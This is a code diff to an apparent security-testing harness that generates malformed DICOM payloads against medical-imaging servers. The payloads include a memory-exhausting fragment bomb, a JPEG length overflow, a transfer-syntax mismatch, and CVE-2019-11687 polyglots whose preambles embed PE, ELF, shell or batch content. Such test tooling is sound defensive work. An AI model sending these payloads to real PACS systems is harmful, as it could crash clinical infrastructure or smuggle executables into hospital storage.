@@ -133,6 +133,7 @@ try:
         DICOMMaximumLength, DICOMImplementationClassUID,
         build_presentation_context_rq, build_user_information,
         DEFAULT_TRANSFER_SYNTAX_UID, VERIFICATION_SOP_CLASS_UID,
+        IMPLICIT_VR_LITTLE_ENDIAN_UID, EXPLICIT_VR_LITTLE_ENDIAN_UID,
         CT_IMAGE_STORAGE_SOP_CLASS_UID, IMPLEMENTATION_CLASS_UID,
         MR_IMAGE_STORAGE_SOP_CLASS_UID, SECONDARY_CAPTURE_SOP_CLASS_UID,
         MODALITY_WORKLIST_FIND_SOP_CLASS_UID,
@@ -147,6 +148,8 @@ try:
 except Exception:
     SCAPY_DICOM_AVAILABLE = False
     DEFAULT_TRANSFER_SYNTAX_UID = '1.2.840.10008.1.2'
+    IMPLICIT_VR_LITTLE_ENDIAN_UID = '1.2.840.10008.1.2'
+    EXPLICIT_VR_LITTLE_ENDIAN_UID = '1.2.840.10008.1.2.1'
     VERIFICATION_SOP_CLASS_UID = '1.2.840.10008.1.1'
     CT_IMAGE_STORAGE_SOP_CLASS_UID = '1.2.840.10008.5.1.4.1.1.2'
     MR_IMAGE_STORAGE_SOP_CLASS_UID = '1.2.840.10008.5.1.4.1.1.4'
@@ -1118,17 +1121,26 @@ class MemoryAttacks:
     def fragment_count_bomb() -> AttackResult:
         """Encapsulated pixel data with huge number of fragments."""
         pixel = EncapsulatedPixelData(transfer_syntax='1.2.840.10008.1.2.4.50')
-        
+
         for i in range(10000):
             pixel.add_fragment(b'\xFF\xD8\xFF\xE0')
-        
+
+        # encode_element(), not encode(): the fragments have to be carried by a
+        # (7FE0,0010) element with undefined length or the payload is a bare
+        # item stream, which an SCP rejects as a malformed data set long before
+        # it counts a single fragment.
         return AttackResult(
             name='fragment_count_bomb',
             category='memory',
-            payload=pixel.encode(),
+            payload=pixel.encode_element(implicit_vr=True),
             description='10,000 pixel fragments',
             expected_behavior='May exhaust memory tracking fragments',
-            metadata={'bug_class': 'resource-exhaustion'}
+            metadata={
+                'bug_class': 'resource-exhaustion',
+                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
+                'sop_instance_uid': '1.2.3.4.5',
+                'transfer_syntax': '1.2.840.10008.1.2.4.50',
+            },
         )
     
     @staticmethod
@@ -1270,14 +1282,23 @@ class MemoryAttacks:
         
         pixel = EncapsulatedPixelData(transfer_syntax='1.2.840.10008.1.2.4.50')
         pixel.add_fragment(fake_jpeg)
-        
+
+        # The lie under test is the JPEG APP0 segment length, so the DICOM
+        # framing around it has to be valid: wrapped in (7FE0,0010) with
+        # undefined length, or the SCP stops at the data set and the JPEG
+        # decoder — the actual target — is never invoked.
         return AttackResult(
             name='encapsulated_frame_overflow',
             category='memory',
-            payload=pixel.encode(),
+            payload=pixel.encode_element(implicit_vr=True),
             description='JPEG with oversized segment length',
             expected_behavior='JPEG decoder should handle gracefully',
-            metadata={'bug_class': 'codec-length'}
+            metadata={
+                'bug_class': 'codec-length',
+                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
+                'sop_instance_uid': '1.2.3.4.5',
+                'transfer_syntax': '1.2.840.10008.1.2.4.50',
+            },
         )
 
     @classmethod
@@ -1326,13 +1347,61 @@ class LogicAttacks:
             description='Meta says Explicit VR, data is Implicit VR',
             expected_behavior='Parser should detect encoding mismatch',
             metadata={
-                'coverage_scope': 'negotiated-syntax-enforcement',
+                'coverage_scope': 'file-meta-vs-encoding',
                 'bug_class': 'syntax-vs-encoding-mismatch',
                 'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
                 'sop_instance_uid': '1.2.3.4.5',
             },
         )
-    
+
+    @staticmethod
+    def negotiated_transfer_syntax_mismatch() -> AttackResult:
+        """Dataset encoding contradicts the *negotiated* transfer syntax.
+
+        The sibling above is a file-level mismatch: the Part-10 meta header
+        declares one syntax and the data uses another, which a receiver can
+        catch by reading its own header. This one moves the lie onto the
+        association. The presentation context is negotiated as Implicit VR
+        Little Endian, so the SCP commits to reading bare ``tag + 4-byte
+        length`` elements — but the dataset that arrives is Explicit VR, where
+        those same four bytes are a 2-byte VR followed by a 2-byte length.
+
+        There is no meta header on the wire to cross-check against: PS3.5 §7.1
+        makes the negotiated context the *only* authority on how to decode the
+        C-STORE dataset. A receiver that sniffs the encoding instead of obeying
+        the context takes a legacy, rarely exercised path; one that obeys it
+        reads ``'OB'`` as a 32-bit length and derives an enormous element
+        length from ASCII VR bytes. Either way this is the decode path that
+        only ever runs against a peer that is lying.
+        """
+        ds = _injection_base_dataset()
+        ds = ds / Element(0x0028, 0x0010, 'US', 4)               # Rows
+        ds = ds / Element(0x0028, 0x0011, 'US', 4)               # Columns
+        ds = ds / Element(0x0028, 0x0100, 'US', 8)               # Bits Allocated
+        ds = ds / Element(0x7FE0, 0x0010, 'OB', b'\xAA' * 16)    # Pixel Data
+
+        return AttackResult(
+            name='negotiated_transfer_syntax_mismatch',
+            category='logic',
+            # Explicit VR bytes delivered on an Implicit VR context.
+            payload=ds.encode(implicit_vr=False),
+            description=('Dataset is Explicit VR LE but the presentation '
+                         'context negotiates Implicit VR LE'),
+            expected_behavior=('SCP should decode per the negotiated context '
+                               'and reject the object, not sniff the encoding'),
+            metadata={
+                'coverage_scope': 'negotiated-syntax-enforcement',
+                'bug_class': 'syntax-vs-encoding-mismatch',
+                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
+                'sop_instance_uid': '1.2.3.4.5',
+                # Pins what send_cstore negotiates; the payload above is
+                # deliberately encoded the other way.
+                'transfer_syntax': IMPLICIT_VR_LITTLE_ENDIAN_UID,
+                'encoded_transfer_syntax': EXPLICIT_VR_LITTLE_ENDIAN_UID,
+                'delivery_hint': 'cstore',
+            },
+        )
+
     @staticmethod
     def sop_class_mismatch() -> AttackResult:
         """SOP Class UID doesn't match actual content."""
@@ -1446,6 +1515,7 @@ class LogicAttacks:
     def all(cls) -> Generator[AttackResult, None, None]:
         """Yield every logic attack payload."""
         yield cls.transfer_syntax_mismatch()
+        yield cls.negotiated_transfer_syntax_mismatch()
         yield cls.sop_class_mismatch()
         yield cls.private_creator_missing()
         yield cls.uri_ssrf()
@@ -3592,7 +3662,8 @@ class CVEAttacks:
             payload=data,
             description='Sequence with undefined length but no items',
             expected_behavior='Parser may access freed sequence memory',
-            metadata={'cve': 'CVE-2023-32135'}
+            metadata={'cve': 'CVE-2023-32135',
+                      'bug_class': 'dangling-sequence-reference'}
         ))
         
         # Test 2: Invalid nested dataset pointers (beyond EOF)
@@ -3610,7 +3681,8 @@ class CVEAttacks:
             payload=data,
             description='Sequence item with offset beyond EOF',
             expected_behavior='Parser should detect invalid offset',
-            metadata={'cve': 'CVE-2023-32135'}
+            metadata={'cve': 'CVE-2023-32135',
+                      'bug_class': 'oob-item-length'}
         ))
         
         # Test 3: Premature sequence termination (truncated file)
@@ -3629,7 +3701,8 @@ class CVEAttacks:
             payload=data,
             description='Sequence truncated without delimiters',
             expected_behavior='Parser may leave dangling references',
-            metadata={'cve': 'CVE-2023-32135'}
+            metadata={'cve': 'CVE-2023-32135',
+                      'bug_class': 'truncated-sequence'}
         ))
         
         return results
@@ -4058,10 +4131,42 @@ class CVEAttacks:
     # -------------------------------------------------------------------------
     
     @staticmethod
+    def _polyglot_part10(preamble: bytes) -> bytes:
+        """Wrap an executable ``preamble`` in a conformant Part-10 file.
+
+        The whole point of CVE-2019-11687 is a file that is *simultaneously*
+        valid in two formats: a loader sees the preamble, a PACS sees DICOM.
+        That only holds if the DICOM half is genuinely well formed — PS3.10
+        requires File Meta Information (group 0002) directly after ``DICM``,
+        and above all (0002,0010) Transfer Syntax UID, without which a reader
+        does not know how to decode the data set.
+
+        Emitting the preamble, ``DICM``, then jumping straight to a data set
+        element left the file non-conformant, so a strict importer rejects it
+        at the header and the interesting question — whether the PACS stores a
+        file its scanner also considers an executable — is never reached.
+        """
+        df = DicomFile()
+        df.preamble = preamble[:128].ljust(128, b'\x00')
+        df.set_meta(
+            sop_class_uid=SECONDARY_CAPTURE_SOP_CLASS_UID,
+            sop_instance_uid='1.2.3.4.5',
+            transfer_syntax='1.2.840.10008.1.2.1',  # Explicit VR LE
+        )
+        df.dataset = CVEAttacks._ds_bytes([
+            Element(0x0008, 0x0016, 'UI', SECONDARY_CAPTURE_SOP_CLASS_UID),
+            Element(0x0008, 0x0018, 'UI', '1.2.3.4.5'),
+            Element(0x0008, 0x0060, 'CS', 'OT'),
+            Element(0x0010, 0x0010, 'PN', 'Doe^John'),
+            Element(0x0010, 0x0020, 'LO', '12345'),
+        ])
+        return df.encode()
+
+    @staticmethod
     def cve_2019_11687_polyglot() -> List[AttackResult]:
         """
         CVE-2019-11687: Executable Embedding in DICOM Preamble
-        
+
         The 128-byte preamble can contain PE/ELF headers, making the file
         valid as both DICOM and executable.
         """
@@ -4074,10 +4179,7 @@ class CVEAttacks:
         dos_header += b'\x00' * (64 - len(dos_header))  # Pad DOS header to 64 bytes
         dos_header += b'\x00' * 64  # Rest of preamble
         
-        file_data = dos_header + b'DICM'
-        # Add minimal dataset
-        file_data += struct.pack('<HH', 0x0008, 0x0016) + b'UI' + struct.pack('<H', 26)
-        file_data += b'1.2.840.10008.5.1.4.1.1.7\x00'
+        file_data = CVEAttacks._polyglot_part10(dos_header)
         
         results.append(AttackResult(
             name='cve_2019_11687_01_pe_header',
@@ -4095,9 +4197,7 @@ class CVEAttacks:
         elf_header += b'\x01'  # ELF version
         elf_header += b'\x00' * (128 - len(elf_header))  # Pad
         
-        file_data = elf_header + b'DICM'
-        file_data += struct.pack('<HH', 0x0008, 0x0016) + b'UI' + struct.pack('<H', 26)
-        file_data += b'1.2.840.10008.5.1.4.1.1.7\x00'
+        file_data = CVEAttacks._polyglot_part10(elf_header)
         
         results.append(AttackResult(
             name='cve_2019_11687_02_elf_header',
@@ -4112,9 +4212,7 @@ class CVEAttacks:
         script = b'#!/bin/sh\necho "pwned"\n#'
         script += b'\x00' * (128 - len(script))
         
-        file_data = script + b'DICM'
-        file_data += struct.pack('<HH', 0x0008, 0x0016) + b'UI' + struct.pack('<H', 26)
-        file_data += b'1.2.840.10008.5.1.4.1.1.7\x00'
+        file_data = CVEAttacks._polyglot_part10(script)
         
         results.append(AttackResult(
             name='cve_2019_11687_03_script_preamble',
@@ -4129,9 +4227,7 @@ class CVEAttacks:
         batch = b'@echo off\r\necho pwned\r\nREM '
         batch += b' ' * (128 - len(batch))
         
-        file_data = batch + b'DICM'
-        file_data += struct.pack('<HH', 0x0008, 0x0016) + b'UI' + struct.pack('<H', 26)
-        file_data += b'1.2.840.10008.5.1.4.1.1.7\x00'
+        file_data = CVEAttacks._polyglot_part10(batch)
         
         results.append(AttackResult(
             name='cve_2019_11687_04_batch_preamble',
@@ -4151,9 +4247,7 @@ class CVEAttacks:
         tiff += struct.pack('<I', 0)          # no next IFD
         tiff += b'\x00' * (128 - len(tiff))   # pad out the 128-byte preamble
 
-        file_data = tiff + b'DICM'
-        file_data += struct.pack('<HH', 0x0008, 0x0016) + b'UI' + struct.pack('<H', 26)
-        file_data += b'1.2.840.10008.5.1.4.1.1.7\x00'
+        file_data = CVEAttacks._polyglot_part10(tiff)
 
         results.append(AttackResult(
             name='cve_2019_11687_05_tiff_header',
